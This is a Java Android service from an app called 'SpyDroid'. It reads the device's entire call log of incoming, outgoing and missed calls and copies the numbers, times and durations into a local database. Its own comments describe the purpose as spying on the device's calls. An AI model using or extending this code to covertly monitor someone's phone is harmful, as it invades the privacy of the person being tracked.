package com.innolabs.spydroid;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.util.Log;

/**
 * Call Listener Service is a service used to SPY the Call logs from the device. All INCOMING, OUTGOING and MISSED calls are logged and store to a database in this service.
 * 
 * @see android.app.Service
 * 
 * @author Srikanth Rao
 *
 */
@SuppressLint("SimpleDateFormat")
public class CallListeners extends Service {

	/** Static variable dataBase of type DataBase */
	static DataBase dataBase;

	/** String variables to store the Incoming Calls table name */
	String incomingCallsTable = "INCOMING_CALLS";
	
	/** String variable to store the Outgoing Calls table name */
	String outgoingCallsTable = "OUTGOING_CALLS";

	/** String variable to store the Missed Calls table name */
	String missedCallsTable = "MISSED_CALLS";

	/** String value to show the TAG for the activity in the LOG CAT */
	public static String CALLS_TAG = "SPY DROID - CALLS LISTENER";

	/** Arraylist of String to store the Incoming call Phone Number */
	public static ArrayList<String> al_incoming_number = new ArrayList<String>();

	/** Arraylist of String to store the Incoming call Date and Time */
	public static ArrayList<String> al_incoming_datetime = new ArrayList<String>();

	/** Arraylist of String to store the Incoming call Duration */
	public static ArrayList<String> al_incoming_duration = new ArrayList<String>();

	/** Arraylist of String to store the Outgoing call Phone Number */
	public static ArrayList<String> al_outgoing_number = new ArrayList<String>();

	/** Arraylist of String to store the Outgoing call Date and Time */
	public static ArrayList<String> al_outgoing_datetime = new ArrayList<String>();

	/** Arraylist of String to store the Outgoing call Duration */
	public static ArrayList<String> al_outgoing_duration = new ArrayList<String>();

	/** Arraylist of String to store the Missed call Phone Number */
	public static ArrayList<String> al_missed_number = new ArrayList<String>();

	/** Arraylist of String to store the Missed call Date and Time */
	public static ArrayList<String> al_missed_datetime = new ArrayList<String>();

	/** Arraylist of String to store the Missed call Duration */
	public static ArrayList<String> al_missed_duration = new ArrayList<String>();

	/** Method called when BindService is called from other instance
	 * 
	 * @param intent The Intent from which the method was called
	 * 
	 * @return null Noting is sent back to the bindService method
	 * 
	 * @see android.app.Service#onBind(Intent)
	 */
	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}

	/**
	 * Method that starts as soon as the Calls Listener service is started.
	 * 
	 * This method is used to log or spy or track all the Incoming, Outgoing and Missed calls from the device and save them to a database.
	 * 
	 * @see android.app.Service#onStartCommand(Intent, int, int)
	 * 
	 * @return The Intent, Flags and startId which was sent as arguments
	 */
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		Log.v(CALLS_TAG, "Calls Listener Service Started");
		
		// Opening or Creating Database
		dataBase = new DataBase(this, "SPY_DROID");

		// Making the database Writable
		dataBase.getWritableDatabase();

		Log.v(CALLS_TAG, "Opening or Creating Database and getting Write Permissions");

		// Creating Tables for the Database
		dataBase.createTable(incomingCallsTable, getTableValues());
		dataBase.createTable(outgoingCallsTable, getTableValues());
		dataBase.createTable(missedCallsTable, getTableValues());

		Log.v(CALLS_TAG, "DataBase Tables Created");

		// Deleting Table all rows present if any 
		dataBase.deleteTableElements(incomingCallsTable);			
		dataBase.deleteTableElements(outgoingCallsTable);
		dataBase.deleteTableElements(missedCallsTable);

		Log.v(CALLS_TAG, "Deleting Table rows from the Database");

		// Spy Calls
		spyCalls();

		Log.v(CALLS_TAG, "Started SPYING Calls");

		// Close Database
		dataBase.close();

		Log.v(CALLS_TAG, "DataBase Closed");

		return super.onStartCommand(intent, flags, startId);
	}


	/**
	 * Spy Calls is a method in which the logs are tracked and stored to database
	 */
	private void spyCalls() {

		// Creating Calls Cursor
		Cursor calls_cursor = null;

		// Getting Content Provider Permissions
		calls_cursor = getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null,null);

		Log.v(CALLS_TAG, "Getting Content Provider Permission and copying the Calls log to Calls Cursor");

		// Checking if Calls Cursor is Empty
		if (calls_cursor.getCount() == 0) {

			Log.v(CALLS_TAG, "Calls Cursor Empty");

			return;
		}

		// Accessing the elements of Calls Cursor one by one
		while (calls_cursor.moveToNext()) {

			// Getting the Call Type
			String callType = calls_cursor.getString(calls_cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE));

			Log.v(CALLS_TAG, "Call Type : "+callType);

			// Saving the Phone Number, Date and Duration of calls to String and Long type variables
			String callNumber = calls_cursor.getString(calls_cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
			long callDateTime = calls_cursor.getLong(calls_cursor.getColumnIndex(android.provider.CallLog.Calls.DATE));
			String callDuration = calls_cursor.getString(calls_cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION));

			Log.v(CALLS_TAG, "Call Number : "+callNumber+" Call Date and Time : "+callDateTime+" Call Duration : "+callDuration);

			// Setting Simple Date Format
			SimpleDateFormat datePattern = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			String dateString = datePattern.format(callDateTime);

			// Checking if the Call is Incoming Type
			if (Integer.parseInt(callType) == android.provider.CallLog.Calls.INCOMING_TYPE) {

				// Clearing the Arraylists before adding new values
				al_incoming_number.clear();
				al_incoming_datetime.clear();
				al_incoming_duration.clear();

				String strDateTime[] = null;

				// Creating a Incoming Calls Cursor and opening the Incoming Calls Table
				Cursor incomingCursor = CallListeners.dataBase.getValues(incomingCallsTable);
				
				Log.v(CALLS_TAG, "Incoming Cursor created for Database Table "+incomingCallsTable);

				// Getting count of number of values in Incoming Calls Cursor
				int count = incomingCursor.getCount();

				// Checking if Cursor is not empty
				if (count > 0) {

					strDateTime = new String[count];

					// Moving the Cursor to first position
					incomingCursor.moveToFirst();

					// Saving the data to Arraylist from Incoming Calls Cursor
					for (int counter = 0; counter < count; counter++) {

						// Getting date from Incoming Cursor
						strDateTime[counter] = incomingCursor.getString(incomingCursor.getColumnIndex("date"));
						al_incoming_datetime.add(strDateTime[counter]);
						
						// Moving to next value in Cursor
						incomingCursor.moveToNext();
					}
				}

				// Checking if the Arraylist element contains Date String
				if (!al_incoming_datetime.contains(dateString)) {

					// Adding values to ContentValues object
					ContentValues incomingContent = new ContentValues();
					incomingContent.put("date", dateString);
					incomingContent.put("phonenum", callNumber);
					incomingContent.put("duration", callDuration);

					// Inserting Content Values data to the Database table
					dataBase.insertValues(incomingCallsTable, incomingContent);
					
					Log.v(CALLS_TAG, "Data inserted into table "+incomingCallsTable);
				}

				// Closing Incoming Calls Cursor
				incomingCursor.close();
				
				Log.v(CALLS_TAG, "Incoming Cursor Closed");
			}

			// Checking if the Call is Outgoing Type
			if(Integer.parseInt(callType) == android.provider.CallLog.Calls.OUTGOING_TYPE)
			{

				// Clearing the Arraylists before adding new values
				al_outgoing_number.clear();
				al_outgoing_datetime.clear();
				al_outgoing_duration.clear();

				String strDateTime[] = null;

				// Creating a Outgoing Calls Cursor and opening the Outgoing Calls Table
				Cursor outgoingCursor = CallListeners.dataBase.getValues(outgoingCallsTable);

				Log.v(CALLS_TAG, "Outgoing Cursor created for Database Table "+outgoingCallsTable);
				
				// Getting count of number of values in Outgoing Calls Cursor
				int count = outgoingCursor.getCount();

				// Checking if Cursor is not empty
				if(count > 0)
				{
					strDateTime = new String[count];

					// Moving the Cursor to first position
					outgoingCursor.moveToFirst();

					// Saving the data to Arraylist from Outgoing Calls Cursor
					for (int counter = 0; counter < count; counter++) {

						// Getting date from Outgoing Cursor
						strDateTime[counter] = outgoingCursor.getString(outgoingCursor.getColumnIndex("date"));
						al_outgoing_datetime.add(strDateTime[counter]);

						// Moving to next value in Cursor
						outgoingCursor.moveToNext();
					}
				}

				// Checking if the Arraylist element contains Date String
				if(!al_outgoing_datetime.contains(dateString))
				{
					// Adding values to ContentValues object
					ContentValues outgoingContent = new ContentValues();
					outgoingContent.put("date",	dateString);
					outgoingContent.put("phonenum", callNumber);
					outgoingContent.put("duration", callDuration);

					// Inserting Content Values data to the Database table
					dataBase.insertValues(outgoingCallsTable, outgoingContent);
					
					Log.v(CALLS_TAG, "Data inserted into table "+outgoingCallsTable);
				}

				// Closing Outgoing Calls Cursor
				outgoingCursor.close();
				
				Log.v(CALLS_TAG, "Outgoing Cursor Closed");
			}

			// Checking if the Call is Missed Type
			if(Integer.parseInt(callType) == android.provider.CallLog.Calls.MISSED_TYPE)
			{

				// Clearing the Arraylists before adding new values
				al_missed_number.clear();
				al_missed_datetime.clear();
				al_missed_duration.clear();

				String strDateTime[] = null;

				// Creating a Missed Calls Cursor and opening the Missed Calls Table
				Cursor missedCursor = CallListeners.dataBase.getValues(missedCallsTable);

				Log.v(CALLS_TAG, "Missed Cursor created for Database Table "+missedCallsTable);
				
				// Getting count of number of values in Missed Calls Cursor
				int count = missedCursor.getCount();

				// Checking if Cursor is not empty
				if(count > 0)
				{
					strDateTime = new String[count];

					// Moving the Cursor to first position
					missedCursor.moveToFirst();

					// Saving the data to Arraylist from Missed Calls Cursor
					for (int counter = 0; counter < count ; counter++) {

						// Getting date from Missed Cursor
						strDateTime[counter] = missedCursor.getString(missedCursor.getColumnIndex("date"));
						al_missed_datetime.add(strDateTime[counter]);

						// Moving to next value in Cursor
						missedCursor.moveToNext();
					}
				}

				// Checking if the Arraylist element contains Date String
				if(!al_missed_datetime.contains(dateString))
				{
					// Adding values to ContentValues object
					ContentValues missedContent = new ContentValues();
					missedContent.put("date", dateString);
					missedContent.put("phonenum", callNumber);
					missedContent.put("duration", callDuration);

					// Inserting Content Values data to the Database table
					dataBase.insertValues(missedCallsTable, missedContent);
					
					Log.v(CALLS_TAG, "Data inserted into table "+missedCallsTable);
				}

				// Closing Missed Calls Cursor
				missedCursor.close();
				
				Log.v(CALLS_TAG, "Missed Cursor Closed");
			}

		}

		// Closing Calls Cursor
		calls_cursor.close();
		
		Log.v(CALLS_TAG, "Calls Cursor Closed");
	}

	/**
	 * Get Table values is a method to return the Column names for the Database Table
	 *  
	 * @return String value : Column names of the Table
	 */
	private String getTableValues() {

		// Table Column Values
		String tablevalues = "SlNo INTEGER PRIMARY KEY,date TEXT,phonenum TEXT,duration TEXT";

		return tablevalues;
	}

}
